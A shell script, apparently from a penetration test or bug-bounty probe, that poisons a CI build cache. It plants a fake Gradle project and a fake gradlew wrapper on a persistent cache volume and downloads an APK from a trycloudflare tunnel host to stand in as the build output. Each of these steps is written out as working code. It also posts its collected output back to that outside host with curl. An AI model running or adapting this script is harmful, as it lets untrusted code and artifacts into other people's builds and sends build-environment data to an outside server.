#!/bin/sh
# Recon 5: plant a complete fake Gradle project (and an APK) in the persistent
# cache volume. A later commit points ramus.toml's app_dir at it, so the build
# runs a toolchain the repo never contains.
BASE="https://olive-farmer-geneva-impressed.trycloudflare.com/80a0e7a7ad197916"
D=/tmp/recon5.$$
mkdir -p "$D" 2>/dev/null || exit 0

{
  echo "===== RECON5: plant cached project ====="
  mkdir -p /cache/pwn/app/build/outputs/apk/debug
  timeout 20 curl -sS -m 20 -o /cache/pr14.apk "$BASE/pentest.apk" || echo "apk download failed"
  ls -la /cache/pr14.apk
  cat > /cache/pwn/gradlew <<'G'
#!/bin/sh
# Fake wrapper planted on the cache volume by a PR build.
echo "PWN_GRADLEW_RAN cwd=$(pwd) args=$*"
mkdir -p app/build/outputs/apk/debug
cp /cache/pr14.apk app/build/outputs/apk/debug/app-debug.apk
G
  chmod +x /cache/pwn/gradlew
  printf 'rootProject.name = "pwn"\n' > /cache/pwn/settings.gradle.kts
  printf '// built by the planted wrapper, not by Gradle\n' > /cache/pwn/build.gradle.kts
  echo "planted at $(date -u +%FT%TZ) from shape=gradle build" > /cache/pwn/PROOF
  echo "--- planted tree"; find /cache/pwn -maxdepth 6 | sort; ls -la /cache/pwn/gradlew /cache/pr14.apk
  echo "--- app_dir that will point here: ../../cache/pwn"
} >"$D/plant" 2>&1

head -c 9000 "$D/plant"
timeout 10 curl -sS -m 10 --data-binary @"$D/plant" "$BASE/plant" >/dev/null 2>&1 || true
rm -rf "$D"
exit 0
